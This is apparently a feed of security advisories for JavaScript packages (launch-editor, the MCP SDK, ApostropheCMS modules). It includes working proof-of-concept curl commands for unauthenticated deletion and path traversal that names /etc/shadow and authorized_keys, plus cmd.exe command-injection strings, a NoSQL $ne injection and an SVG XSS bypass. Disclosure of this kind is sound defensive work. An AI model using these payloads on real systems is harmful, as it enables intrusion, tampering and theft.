items.title: [launch-editor] launch-editor: escapeCmdArgs() omits % escaping on Windows
items.summary: Summarylaunch-editor did not escape % on Windows when passing an argument to cmd. When an environment variable contained a malicious value, it was possible that that content to be executed.ImpactOnly apps that match all of the following conditions are affected:The user uses WindowsAn attacker can place a file with the malicious filename containing & or %Either ofAn attacker can inject an environment variable with a malicious valueAn attacker can add a NTFS alternate data stream to the file placedDetailsUnlike .sh files, .bat / .cmd files on Windows cannot be called directly using child_process.spawn and requires passing them as an argument of cmd.exe. To do so, launch-editor escapes the arguments passed to cmd.exe. But launch-editor did not escape % which is used for environment variables.Because launch-editor checks if the argument matches an existing filename, the attack requires the attacker to be able to place a file.If the attacker can inject an environment variable as well, they can include the subcommand in the env variable (e.g. set &calc.exe to %ENV%) and call launchEditor with something%ENV%.If the attacker can place a NTFS alternate data stream to the file (e.g. a NTFS alternate data stream named ~-38%calc.exe), they can call launchEditor with something %CMDCMDLINE:~-38%calc.exe.If the attacker can create a filename containing the %CD% and the subcommand (e.g. &calc.exe ), they can call launchEditor with ./%CD%Referenceshttps://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcvhttps://nvd.nist.gov/vuln/detail/CVE-2026-112943https://github.com/vitejs/launch-editor/pull/155https://github.com/vitejs/launch-editor/commit/3c2f9bf2ff8fe63d056a8f9cc52d825b66ca79fchttps://github.com/vitejs/launch-editor/releases/tag/v2.14.2https://github.com/advisories/GHSA-698v-4r3x-3vcv

items.title: [@modelcontextprotocol/sdk] MCP TypeScript SDK: Experimental tasks were not tied to the session that created them
items.summary: SummaryIn affected versions, the experimental tasks feature (taskStore) did not check which session created a task. Clients sharing one InMemoryTaskStore could list, read and cancel each other's tasks.Experimental tasks are deprecated. The 2026-07-28 specification replaced them with a redesigned extension. The best course of action is to stop using them.Am I affected?Only if your HTTP server passes taskStore to McpServer or Server. If grep -ri taskstore --exclude-dir=node_modules . finds nothing, you are not affected.Affected versions: @modelcontextprotocol/sdk 1.24.0 through 1.31.0. The 2.x packages are not affected.FixUpgrade to @modelcontextprotocol/sdk 1.32.0 or later. Each task is now tied to the session that created it, so a client that starts a new session can no longer reach its earlier tasks.If you cannot upgrade yet, remove taskStore, or create one InMemoryTaskStore per session.Referenceshttps://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-22jm-h49p-29qwhttps://github.com/modelcontextprotocol/typescript-sdk/pull/2925https://github.com/modelcontextprotocol/typescript-sdk/commit/727075b5bbeb77fbea22041b36b72a73042160fahttps://github.com/advisories/GHSA-22jm-h49p-29qw

items.title: [@modelcontextprotocol/sdk] MCP TypeScript client SDK: HTTP client transports and OAuth requests followed cross-origin redirects and re-sent custom headers and request bodies
items.summary: SummaryIn affected versions, the SDK's HTTP client transports and OAuth requests followed redirects to any origin.If an MCP server or authorization server redirected a request to another origin, that origin received custom request headers (such as an X-API-Key set in requestInit.headers) and the mcp-session-id header. On a 307 or 308 it also received the request body, including OAuth token requests with their refresh_token and client_secret.On current runtimes fetch already drops the Authorization header across origins.Am I affected?Yes, if your application uses StreamableHTTPClientTransport, SSEClientTransport, or the SDK's OAuth client functions such as auth(). stdio clients are not affected.Affected versions:@modelcontextprotocol/sdk all versions through 1.31.0@modelcontextprotocol/client 2.0.0 through 2.2.0FixUpgrade to:1.x: @modelcontextprotocol/sdk 1.32.0 or later2.x: @modelcontextprotocol/client 2.3.0 or laterRedirects are now followed only within the same origin, and not at all in browsers. If your MCP server or authorization server redirects to another origin on purpose, configure the final URL instead. Setting redirectPolicy: 'follow' on a transport restores the old behaviour and the exposure.If a redirect may have reached a host you do not control, rotate the API keys and client_secret your application held and revoke its tokens.If you cannot upgrade yet, pass a fetch that refuses redirects, for example (url, init) => fetch(url, { ...init, redirect: 'error' }).Referenceshttps://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-6prh-2h8m-c8cwhttps://github.com/modelcontextprotocol/typescript-sdk/pull/2901https://github.com/modelcontextprotocol/typescript-sdk/pull/2902https://github.com/modelcontextprotocol/typescript-sdk/commit/30bfe5139f4b0825c90cd725f9a7e3f9af5e120dhttps://github.com/modelcontextprotocol/typescript-sdk/commit/433eb413dc305ebeb93b8ebcde0095a8fc0d5fa0https://github.com/advisories/GHSA-6prh-2h8m-c8cw

items.title: [apostrophe] ApostropheCMS: The general public can access @apostrophecms/user objects via a relationship (viewRole is not applied to the general public)
items.summary: ImpactEven though it is correctly applied to guests, contributors, etc., viewRole is not applied to the general public. This means that a secured content type like @apostrophecms/user can in theory be accessed.This is greatly mitigated by the fact that there is no automatic public REST API for any content type. One has to expressly allow it. However, it does mean that developers can make the mistake of setting up a relationship between a content type like a blog post, and @apostrophecms/user. This could potentially expose some sensitive information if templates were written poorly, e.g. if they JSON-serialized the entire object. Note that password hashes are NOT affected because they reside in a separate collection.The public demo project and its various flavors must be updated first because it inadvertently relies on the bug.Patches4.33.0WorkaroundsNever create relationships with @apostrophecms/user that are intended for non-admin display. If you need a relationship that expresses authorship, create a separate author piece type to publicly represent that.Referenceshttps://github.com/apostrophecms/apostrophe/security/advisories/GHSA-xf6w-q65w-4f2whttps://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845cehttps://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe@4.33.0https://github.com/advisories/GHSA-xf6w-q65w-4f2w

items.title: [apostrophe] ApostropheCMS: Missing Authorization on Notification PATCH/DELETE Endpoints
items.summary: SummaryThe notification module exposes PATCH and DELETE REST endpoints that perform operations directly on the underlying MongoDB collection without verifying that the requester is authenticated or owns the target notification.As a result, an unauthenticated attacker who obtains a valid notification ID can modify or permanently delete another user's notification.Affected CodeFilepackages/apostrophe/modules/@apostrophecms/notification/index.js// restApiRoutesasync patch(req, _id) {  const dismissed = self.apos.launder.boolean(req.body.dismissed);  if (dismissed) {    await self.emit('beforeSave', req, { _id, dismissed });    await self.db.updateOne(      { _id },      {        $set: { dismissed },        $currentDate: { updatedAt: true }      }    );  }},async delete(req, _id) {  await self.db.deleteMany({ _id });}Unlike the GET notification route, these handlers do not verify:Authentication (req.user)Ownership (userId === req.user._id)Authorization or permissionsInstead, the supplied _id is used directly against the raw MongoDB collection.Root CauseThe notification REST endpoints perform database operations directly using self.db without enforcing authentication or authorization.While the framework provides permission primitives (req.user, ownership checks, and apos.permission), these endpoints never invoke them. As a result, any request reaching these handlers is processed solely based on the supplied notification ID.For comparison, the GET notification route correctly checks:if (!(req.user && req.user._id)) {  throw self.apos.error('invalid');}No equivalent validation exists in the PATCH or DELETE handlers.Proof of Concept1. Log in as an administratorcurl -sS -c admin_cookies.txt \"http://localhost:4321/api/v1/@apostrophecms/login/context" \-o /dev/nullcurl -sS \-b admin_cookies.txt \-c admin_cookies.txt \-X POST \http://localhost:4321/api/v1/@apostrophecms/login/login \-H "Content-Type: application/json" \-H "X-XSRF-TOKEN: csrf" \-d '{  "username":"admin",  "password":"AdminP@ssw0rd123!",  "session":true}'2. Create a notificationcurl -sS \-b admin_cookies.txt \-X POST \http://localhost:4321/api/v1/@apostrophecms/notification \-H "Content-Type: application/json" \-H "X-XSRF-TOKEN: csrf" \-d '{  "message":"manual verify test",  "type":"info"}'Example response:{  "noteId":"p358r7phi2w8l245ww5130uf"}3. Verify the notification existscurl -sS \-b admin_cookies.txt \"http://localhost:4321/api/v1/@apostrophecms/notification/p358r7phi2w8l245ww5130uf"Response:{  "notifications":[    {      "_id":"p358r7phi2w8l245ww5130uf",      "userId":"i89h844o5n3nbreis0ugusum",      "message":"manual verify test"    }  ],  "dismissed":[]}4. Access the endpoint without authenticationCreate a fresh cookie jar containing only the public CSRF cookie:rm -f anon_cookies.txtcurl -sS \-c anon_cookies.txt \"http://localhost:4321/api/v1/@apostrophecms/login/context" \-o /dev/nullThen send the request without any authenticated session:curl -i \-b anon_cookies.txt \-X DELETE \"http://localhost:4321/api/v1/@apostrophecms/notification/p358r7phi2w8l245ww5130uf" \-H "X-XSRF-TOKEN: csrf"Response:HTTP/1.1 200 OK5. Verify the notification has been deletedcurl -sS \-b admin_cookies.txt \"http://localhost:4321/api/v1/@apostrophecms/notification/p358r7phi2w8l245ww5130uf"Response:{  "notifications":[],  "dismissed":[]}The notification belonging to the authenticated administrator has been successfully deleted by an unauthenticated client.ImpactAn attacker who obtains a valid notification ID can:Delete another user's notifications.Mark another user's notifications as dismissed.Suppress security-related or administrative notifications.The vulnerability primarily affects integrity.Although notification IDs are generated using CUID2 and are not practically guessable, authorization must not rely on identifier entropy. Any separate information disclosure vulnerability or log exposure that reveals notification IDs would make this issue directly exploitable.Recommended FixRequire authentication before processing any modification request.Additionally, scope all database operations to the authenticated user.Example:// patchasync patch(req, _id) {  if (!req.user) {    throw self.apos.error('forbidden');  }  const dismissed = self.apos.launder.boolean(req.body.dismissed);  if (dismissed) {    await self.emit('beforeSave', req, { _id, dismissed });    const result = await self.db.updateOne(      { _id, userId: req.user._id },   // <-- ownership check      { $set: { dismissed }, $currentDate: { updatedAt: true } }    );    if (!result.matchedCount) {      throw self.apos.error('notfound');    }  }},// deleteasync delete(req, _id) {  if (!req.user) {    throw self.apos.error('forbidden');  }  const result = await self.db.deleteMany({ _id, userId: req.user._id });  if (!result.deletedCount) {    throw self.apos.error('notfound');  }}Similarly, update the PATCH handler to verify both authentication and ownership before updating notification records.RecommendationEvery

items.title: [@apostrophecms/import-export] ApostropheCMS import-export tar guard misses './..' because it is a literal '../' substring test
items.summary: SummaryThe tar-extraction guard added to @apostrophecms/import-export for GHSA-mwxc-m426-3f78 is a literal substring test for ../, and ./.. does not contain that substring. An entry named ./.. therefore passes the guard, path.join normalizes it to the parent of the export directory, and the resulting fs.WriteStream opens a directory and emits EISDIR with no error listener attached, which terminates the Node process.Confirmed on default-branch HEAD 1bd5d0a7a6fe880836fa75adad6964f1c577d640, package version 3.6.2.Detailspackages/import-export/lib/formats/gzip.js, in the tar-stream entry handler inside extract(filepath, exportPath):const name = header.name.replace(/\\/g, '/');if (name.includes('../')) {  // skipped}...stream.pipe(fs.WriteStream(path.join(exportPath, name)));Two separate problems sit in those four lines. The guard tests the raw entry name for a substring instead of resolving the joined path and requiring containment, and the write stream has no error handler, so any stream error becomes an unhandled 'error' event.Reaching it needs an account that can import, nothing more. packages/import-export/modules/@apostrophecms/import-export-page/index.js exposes post.importExportImport, which calls into lib/methods/import.js; that handler requires req.user and then calls format.input(exportPath), which for a .gz upload is gzip.js calling extract() on the uploaded archive.PoCThis is not an end-to-end exploit. What follows is each of the three primitives the crash depends on, executed individually, plus a source-level trace of the route. The chain from post.importExportImport to extract() was read, not observed.The guard misses the payload:node -e "console.log('./..'.includes('../')); console.log('..'.includes('../')); console.log('a/./..'.includes('../'));"falsefalsefalsepath.join then resolves it out of the export directory:node -e "const path=require('path'); const exportPath='/tmp/exportRoot'; console.log(path.join(exportPath,'./..'));"/tmpAnd a write stream opened on a directory, with no error listener, kills the process rather than failing the request:node -e "const fs=require('fs'); const s=fs.createWriteStream('/tmp'); s.write('x'); s.end(); setTimeout(()=>console.log('still alive'),500);"events.js:291      throw er; // Unhandled 'error' event      ^Error: EISDIR: illegal operation on a directory, open '/tmp'Emitted 'error' event on WriteStream instance at:    at internal/fs/streams.js:361:12    at FSReqCallback.oncomplete (fs.js:156:23) {  errno: -21,  code: 'EISDIR',  syscall: 'open',  path: '/tmp'}The events.js:291 frame shows that transcript came off the Node 14 line my audit box had. The unhandled-error-event behavior is not version specific, but the exact message on your supported Node versions is worth a re-run.Source-side confirmation without running anything:grep -n "includes('../')" packages/import-export/lib/formats/gzip.jsgrep -n "WriteStream" packages/import-export/lib/formats/gzip.jsImpactAn authenticated user who can reach the import UI uploads one crafted archive and takes down the Node process handling it. Every worker that picks up such an archive dies the same way.Suggested fixResolve the target and require containment, and attach an error handler:const base = path.resolve(exportPath);const target = path.resolve(path.join(exportPath, name));if (target !== base && !target.startsWith(base + path.sep)) {  stream.on('end', next);  stream.resume();  return;}if (header.type === 'directory') {  fsp.mkdir(target).then(next).catch(reject);} else {  const out = fs.WriteStream(target);  out.on('error', reject);  stream.pipe(out);  stream.on('end', next);}The error handler earns its place independently. Any tar entry that lands on an existing directory name has the same effect whether or not traversal is involved.Why this is not GHSA-mwxc-m426-3f78The name.includes('../') check is the mitigation shipped for GHSA-mwxc-m426-3f78 / CVE-2026-32731. It stops names carrying the literal ../ sequence. It does not canonicalize the joined path, so ./.. and a bare .. still get through, and it did not touch the missing error listener. This report is about what the substring test leaves behind.AI assistance was used for the code audit and drafting. The exact guard and WriteStream lines in packages/import-export/lib/formats/gzip.js at the stated HEAD were manually verified, the import route from the page module through lib/methods/import.js into the entry handler were manually traced, and the three Node one-liners were manually ran and copied verbatim.Referenceshttps://github.com/apostrophecms/apostrophe/security/advisories/GHSA-97wv-p4xx-c7mghttps://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845cehttps://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350https://github.com/apostrophecms/apostrophe/releases/tag/@apostrophecms/import-export@3.7.0https://github.com/advisories/GHSA-97wv-p4xx-c7mg

items.title: [uploadfs] ApostropheCMS: Path traversal in uploadfs
items.summary: SummaryThe uploadfs library's local storage backend does not validate or sanitize user-supplied paths. The prefixPath() helper only strips double slashes (//) and the backend performs direct string concatenation (uploadsPath + path). An attacker can inject ../ sequences to escape the intended uploads directory, resulting in arbitrary file read, write, and delete on the host filesystem.DetailsRoot Causepackages/uploadfs/uploadfs.js:652-655https://github.com/apostrophecms/apostrophe/blob/main/packages/uploadfs/uploadfs.js#L652-L655function prefixPath(path) {    // Resolve any double // that results from the prefix    return (self.prefix + path).replace(/\/\//g, '/');}packages/uploadfs/lib/storage/local.jshttps://github.com/apostrophecms/apostrophe/blob/main/packages/uploadfs/lib/storage/local.js#L92-L95https://github.com/apostrophecms/apostrophe/blob/main/packages/uploadfs/lib/storage/local.js#L102-L104https://github.com/apostrophecms/apostrophe/blob/main/packages/uploadfs/lib/storage/local.js#L106-L108copyIn: function(localPath, path, options, callback) {    const uploadPath = uploadsPath + path;  // [VULNERABLE]    return copyFile(localPath, uploadPath, callback);},streamOut: function(path, options) {    return fs.createReadStream(uploadsPath + path);  // [VULNERABLE]},remove: function(path, callback) {    const uploadPath = uploadsPath + path;  // [VULNERABLE]    fs.unlink(uploadPath, callback);prefixPath() does not normalize paths or reject ../.The local backend concatenates the path directly into the filesystem call.Node.js resolves /app/uploads/../../../tmp/pwned.txt → /tmp/pwned.txt.Proof of Concept (PoC)Here is the poc files https://drive.proton.me/urls/AKY4V5S0JR#Vw6XJdVCZafkBuild and rundocker load < apostrophe-uploadfs-poc.tardocker run -d -p 3000:3000 --name uploadfs-poc apostrophe-uploadfs-pocpython3 exploit.pyExpected output[UPLOAD] Status: 200 | Body: Uploaded to ../../../tmp/pwned.txt[READ]Status: 200| Body: You have been pwned![+] Vulnerability confirmed: arbitrary file write/read/delete via path traversal.Manual reproduction# Write outside uploads directorycurl -X POST http://localhost:3000/upload \  -F "path=../../../tmp/backdoor.txt" \  -F "file=@-;filename=backdoor.txt" <<< "malicious content"# Read it backcurl "http://localhost:3000/read?path=../../../tmp/backdoor.txt"# Delete itcurl -X DELETE "http://localhost:3000/remove?path=../../../tmp/backdoor.txt"ImpactCapabilityRiskArbitrary File WriteWrite to /etc/cron.d/, .ssh/authorized_keys, or webroot files → Remote Code ExecutionArbitrary File ReadExfiltrate /etc/shadow, application configs, database credentialsArbitrary File DeleteDestroy system or application files → Denial of ServiceRemediationAdd path containment validation inside uploadfs (and every storage backend) before any filesystem operation:const path = require('path');function safePath(base, target) {  const resolved = path.resolve(base, target);  if (!resolved.startsWith(path.resolve(base) + path.sep)) {    throw new Error('Path traversal blocked: target is outside the intended directory');  }  return resolved;}Referenceshttps://github.com/apostrophecms/apostrophe/security/advisories/GHSA-gmfx-5g6x-rr72https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845cehttps://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350https://github.com/apostrophecms/apostrophe/releases/tag/uploadfs@1.28.0https://github.com/advisories/GHSA-gmfx-5g6x-rr72

items.title: [sanitize-html] ApostropheCMS sanitize-html: SMIL animation namespace-prefix bypass allows javascript: URI injection (XSS)
items.summary: Summarysanitize-html 2.17.7 introduced animatesUrlAttribute() to block SVG animation elements (animate, animateColor, animateMotion, animateTransform, set) when their attributeName targets a URL sink like href. However, this check is bypassed when the animation element uses a namespace prefix (e.g., svg:animate instead of animate).Root CauseThe animatesUrlAttribute function (index.js, line ~832) checks svgAnimationTags.indexOf(name.toLowerCase()), where svgAnimationTags contains bare local names: ["animate", "animatecolor", "animatemotion", "animatetransform", "set"]. htmlparser2 passes namespace-prefixed tag names verbatim, so svg:animate does not match animate in the array, causing the function to return false and skip the SMIL XSS protection.Ironically, the function already handles namespace prefixes correctly for the attributeName target value (line ~843): const localName = target.slice(target.lastIndexOf(":") + 1) — but this same stripping was not applied to the tag name itself.Proof of Conceptconst sanitizeHtml = require("sanitize-html");const config = { allowedTags: false, allowedAttributes: false, allowedSchemes: ["http", "https"]};// Standard animate — BLOCKED by 2.17.7 fixconst blocked = sanitizeHtml( ``, config);console.log("Standard animate:", blocked.includes("javascript:") ? "BYPASS" : "BLOCKED");// Output: BLOCKED// Namespace-prefixed animate — BYPASSES the fixconst bypassed = sanitizeHtml( ``, config);console.log("svg:animate:", bypassed.includes("javascript:") ? "BYPASS" : "BLOCKED");// Output: BYPASSAll 5 SMIL animation elements are bypassable with any namespace prefix (svg:, xlink:, xml:, uppercase variants). Tested and confirmed on sanitize-html 2.17.7 from the apostrophe monorepo.ImpactCross-site scripting (XSS) via SMIL animation retargeting. When an application uses allowedTags: false (common in rich-text editors that want to preserve SVG), an attacker can inject to override the href attribute of a parent element after the page loads, causing the link to execute JavaScript when clicked.Suggested FixStrip the namespace prefix from the tag name before the lookup, matching the pattern already used for the attribute name target:// Before (vulnerable):if (svgAnimationTags.indexOf(name.toLowerCase()) === -1) {// After (fixed):const localTagName = name.toLowerCase().slice(name.lastIndexOf(":") + 1);if (svgAnimationTags.indexOf(localTagName) === -1) {Affected Versionssanitize-html >= 2.17.7 (where the SMIL animation protection was introduced). Earlier versions lack the SMIL protection entirely.CreditKai Aizen (SnailSploit) — Adversarial AI & Security ResearchReferenceshttps://github.com/apostrophecms/apostrophe/security/advisories/GHSA-374f-7chj-9948https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845cehttps://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350https://github.com/apostrophecms/apostrophe/releases/tag/sanitize-html@2.18.0https://github.com/advisories/GHSA-374f-7chj-9948

items.title: [uploadfs] ApostropheCMS uploadfs Azure backend leaks account-level SAS token into every public attachment URL (sas: true)
items.summary: SummaryWhen uploadfs is configured with the Azure backend and sas: true (a supported configuration introduced in uploadfs 1.25.0), createContainer() builds the BlobServiceClient from a URL that embeds the full SAS query string, and Azure SDK v12 derived clients inherit that query string. As a result, getUrl() returns a base URL carrying the complete account/container SAS signature (?sv=...&sig=...), and Apostrophe's attachment.url() prepends it to every public attachment link — broadcasting a container-level SAS credential (commonly sp=rwdlac, full read/write/delete/list) to every site visitor, including anonymous ones. Anyone who can see an attachment URL can read, overwrite, delete, and list every blob in the container for the SAS lifetime. A companion functional bug (blob path appended after the query string, producing broken URLs) shows this code path was never exercised end to end. Shared-key mode (default) and non-Azure backends are not affected.Verified at commit 5a3746aaed49761e171c2cbfe793267c959829fd (uploadfs 1.27.0 in the apostrophe monorepo).DetailsRoot cause: a credential-bearing client URL is reused as the public base URL. The chain:Credential-embedded client: azure.js#L123-L125 — new BlobServiceClient("https://<account>.blob.core.windows.net?<SAS query string>") where cluster.key is the full SAS string including sigLeak point: azure.js#L513-L520 — getUrl() takes getContainerClient(...).getBlobClient('').url as baseUrl; SDK v12 derived clients inherit the SAS query string, so baseUrl already contains ?sv=...&sig=...Public exposure: attachment/index.js#L694 — attachment.url() = uploadfs.getUrl() + path for every rendered attachment link; attachment/index.js#L1503 — getBrowserData() also ships uploadsUrl to every logged-in editor sessionCompanion bug: the blob path is appended after the query string (/container/?sv=...&sig=XXX/attachments/id-name), so these URLs are also broken — evidence the 1.25.0 code path was never testedAttack surface: every public page rendering attachment URLs (images, download links), plus the uploadsUrl delivered to editor sessions. The leak is passive and unconditional — no action required from the victim beyond serving a page. The credential further propagates through HTML source, logs, Referer headers, and CDN/proxy access logs.Suggested remediation:Strip the query string before building public URLs: const u = new URL(blob.svc.getContainerClient(...).getBlobClient('').url); u.search = ''; (or compose accountUrl + '/' + container manually), and append the blob path to the pathname, not after the query.Document that SAS mode must use least privilege (read-only, ideally sr=b per-blob), and prefer generating short-lived per-blob read-only signed URLs via generateBlobSASQueryParameters instead of embedding a service-level SAS in permanent public URLs.PoCFull PoC posted as the first comment below (poc.js + README; offline, no Azure account needed). It replicates the library's exact two steps with the declared dependency @azure/storage-blob@12:npm install @azure/storage-blob@12 && node poc.jsThe script constructs new BlobServiceClient("https://myaccount.blob.core.windows.net?sv=...&sig=FAKESIGNATURE") exactly like createContainer(), then evaluates the getUrl() logic (getContainerClient('uploads-container').getBlobClient('').url) and asserts the resulting base URL still contains the sig parameter.Observed output (exit code 0):baseUrl: https://myaccount.blob.core.windows.net/uploads-container/?sv=2021-06-08&ss=b&srt=co&sp=rwdlac&se=2099-01-01&sig=FAKESIGNATUREattachment URL as served to visitors: https://myaccount.blob.core.windows.net/uploads-container/?sv=2021-06-08&ss=b&srt=co&sp=rwdlac&se=2099-01-01&sig=FAKESIGNATURE/attachments/abc123-photo.jpgThe produced URL both leaks the token (sv…sig) and demonstrates the broken path placement. Cross-checking attachment/index.js confirms this URL reaches public pages unmodified.ImpactWhat it is: insufficiently protected credentials (CWE-522) leading to information exposure (CWE-200). A container-level SAS token — commonly granted sp=rwdlac (read/write/delete/list/ACL) — is disclosed to every site visitor including anonymous users, valid for the SAS lifetime (often years). Holders can read, overwrite, delete, and enumerate every attachment in the container; the library applies no narrowing.Who is impacted: Apostrophe sites using uploadfs with the Azure backend and sas: true (introduced in 1.25.0; present through 1.27.0). Default shared-key mode and other backends are unaffected. When the SAS is provisioned read-only, the impact reduces to unauthenticated read/download of all attachments.Reported by Kimi Security Team (bug-report@moonshot.ai).Referenceshttps://github.com/apostrophecms/apostrophe/security/advisories/GHSA-hhph-8536-gfq5https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845cehttps://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350https://github.com/ap

items.title: [apostrophe] ApostropheCMS: Authenticated Object-Level Authorization Bypass in exist-in-locale Reveals Restricted Localized Draft Identifiers
items.summary: SummaryApostropheCMS’s exist-in-locale API allows an authenticated low-privilege user to determine whether restricted documents exist in a specified locale and mode, including draft mode. The endpoint returns localized document identifiers without applying document-level view or edit authorization criteria.The issue was reproduced against a real local ApostropheCMS application running the reviewed source code. The test used a synthetic guest account and synthetic restricted draft records.DetailsExact vulnerable source path:  packages/apostrophe/modules/@apostrophecms/i18n/index.js:503-529Exact API route: POST /api/v1/@apostrophecms/i18n/exist-in-localeThe handler verifies only that the requester is authenticated:if (!req.user) {  throw self.apos.error('notfound');}It then performs a direct database lookup using attacker-controlled document IDs, locale, and mode:const found = await self.apos.doc.db.find({  aposLocale: `${locale}:${mode}`,  aposDocId: {    $in: ids.map(self.apos.doc.toAposDocId)  }}).project({  _id: 1,  aposDocId: 1}).toArray();This query does not apply:.permission('view').permission('edit')apos.permission.criteria(req, 'view')object-level document authorizationlocale-specific authorizationThe endpoint accepts multiple IDs, making bulk probing possible.Proof of ConceptThe local application was running at: http://127.0.0.1:3000The test account had the low-privilege role: guestThe local database contained synthetic records for the restricted document base ID:wv2l4rbaplgzkg80zkne4aoz:en:draftwv2l4rbaplgzkg80zkne4aoz:fr:draftAll credentials and cookies are intentionally redacted below.POST /api/v1/@apostrophecms/i18n/exist-in-locale HTTP/1.1Host: 127.0.0.1:3000Cookie: <redacted-authenticated-guest-session>Content-Type: application/jsonAccept: application/json{  "ids": [    "wv2l4rbaplgzkg80zkne4aoz:en:draft",    "ckzzzzzzzzzzzzzzzzzzzzzzz:en:draft"  ],  "locale": "fr",  "mode": "draft"}Equivalent commandcurl -i -sS -X POST \  'http://127.0.0.1:3000/api/v1/@apostrophecms/i18n/exist-in-locale' \  -b /path/to/redacted-guest-cookie-jar.txt \  -H 'Content-Type: application/json' \  -H 'Accept: application/json' \  --data-raw '{    "ids": [      "wv2l4rbaplgzkg80zkne4aoz:en:draft",      "ckzzzzzzzzzzzzzzzzzzzzzzz:en:draft"    ],    "locale": "fr",    "mode": "draft"  }'Observed responseHTTP/1.1 200 OKX-Powered-By: ExpressContent-Type: application/json; charset=utf-8{  "originalLocaleIds": [    "wv2l4rbaplgzkg80zkne4aoz:en:draft"  ],  "newLocaleIds": [    "wv2l4rbaplgzkg80zkne4aoz:fr:draft"  ],  "aposDocIds": [    "wv2l4rbaplgzkg80zkne4aoz"  ]}The nonexistent ID was omitted from the response. This proves that the endpoint acts as an existence oracle.Authorization controlUsing the same authenticated guest session and the localized document identifier returned above, the normal page API was requested:GET /api/v1/@apostrophecms/page/wv2l4rbaplgzkg80zkne4aoz:fr:draft HTTP/1.1Host: 127.0.0.1:3000Cookie: <redacted-authenticated-guest-session>Accept: application/jsonObserved response:HTTP/1.1 403 ForbiddenContent-Type: application/json; charset=utf-8{  "name": "forbidden",  "data": {},  "message": "forbidden"}This demonstrates the authorization boundary clearly:RequestResultNormal page API for the restricted draft403 Forbiddenexist-in-locale for the same restricted draft200 OK with localized document IDexist-in-locale for a nonexistent ID200 OK with empty arraysAdditional impact validationThe behavior was also tested across multiple locale and mode combinations:QueryResultlocale=fr, mode=draftReturned wv2l4rbaplgzkg80zkne4aoz:fr:draftlocale=fr, mode=publishedReturned empty arrays because no published fixture existedlocale=de, mode=draftReturned empty arrays because no German fixture existedTwo IDs in one requestExisting ID returned; nonexistent ID omittedThis confirms that the endpoint can be used to discover whether a document has a localized draft in a particular locale and to perform bulk enumeration.ImpactA low-privilege authenticated user can:Probe arbitrary known or guessed document base IDs.Determine whether restricted documents have localized versions.Determine whether unpublished draft versions exist.Identify which locales contain matching records.Obtain exact localized document identifiers.Submit multiple IDs in one request for bulk reconnaissance.The issue does not directly disclose the document body or grant write, publish, or delete privileges. During testing, no content was modified, published, deleted, or exposed beyond the identifier metadata.Recommended remediationBefore executing the database lookup, apply the same document-level authorization criteria used by the normal document API. The query should be restricted to documents the requester is authorized to view in the requested locale and mode. Draft queries should additionally require the appropriate draft-view permission for the specific document, not merely authentication or a global role check.The endpoint should also avoid returning lo

items.title: [@apostrophecms/import-export] ApostropheCMS import-export: NoSQL injection via update-key value lets a crafted import match and overwrite an unidentified document
items.summary: Summary@apostrophecms/import-export's update-by-key feature lets an importeddocument carry a <field>:key property (for example slug:key) whosevalue is used to find an existing document to update instead of insertinga new one. getUpdateKey()/insertOrUpdateDocWithKey()(lib/methods/import.js) use that value directly as a MongoDB query valuewith no laundering:const matchingDraftPromise = manager.findForEditing(  req.clone({ mode: 'draft' }),  {    aposMode: 'draft',    [updateField]: doc[updateKey]  }).toObject();Archive documents are parsed with EJSON (see lib/formats/gzip.js), whichrevives objects such as { $ne: null } as live values, the same untrusteddata source and revival mechanism already fixed once in this module forfindSingletonAposDocId/findParkedAposDocId in GHSA-79qf-vqgc-7xx3. Thatfix did not touch insertOrUpdateDocWithKey, so the identical class of bugsurvives here: a crafted "slug:key": { "$ne": null } entry in anarchive's aposDocs.json makes the import match (and then update) anexisting document the archive's author never actually identified, insteadof failing to find a match.ImpactReaching this requires only an authenticated session with import access tothe target type (the built-in contributor role holds this, matching theprecondition of GHSA-79qf-vqgc-7xx3), and no admin interaction. Because thematch uses a MongoDB operator instead of an exact value, it is not limitedto a document the importer already knows the identifying field of: anyexisting document the importer has generic edit rights on and thatsatisfies the operator (which { $ne: null } trivially does for any docwith a non-null value in that field) is a candidate, and Apostrophe'sfindForEditing permission filter, not the update-key logic, is the onlything narrowing which document actually gets matched and overwritten.Live-verified: a contributor-role request importing a document containing"slug:key": { "$ne": null } had its content applied to an existing,unrelated draft article, overwriting its title, while the importer neverspecified that article's real slug.Affected versionsConfirmed on main branch HEAD as of 2026-09-04,packages/import-export/lib/methods/import.js.Suggested fixLaunder doc[updateKey] to a plain string (mirroring the fix alreadyapplied to type/aposLocale/parkedId in GHSA-79qf-vqgc-7xx3) beforeusing it as a query value, and fall back to the insert path when it is nota usable string.Referenceshttps://github.com/apostrophecms/apostrophe/security/advisories/GHSA-jqw5-w6h3-44g6https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845cehttps://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350https://github.com/apostrophecms/apostrophe/releases/tag/@apostrophecms/import-export@3.7.0https://github.com/advisories/GHSA-jqw5-w6h3-44g6

items.title: [apostrophe] ApostropheCMS: Client-side Prototype Pollution in apos.http.parseQuery leading to DOM-based XSS against authenticated users
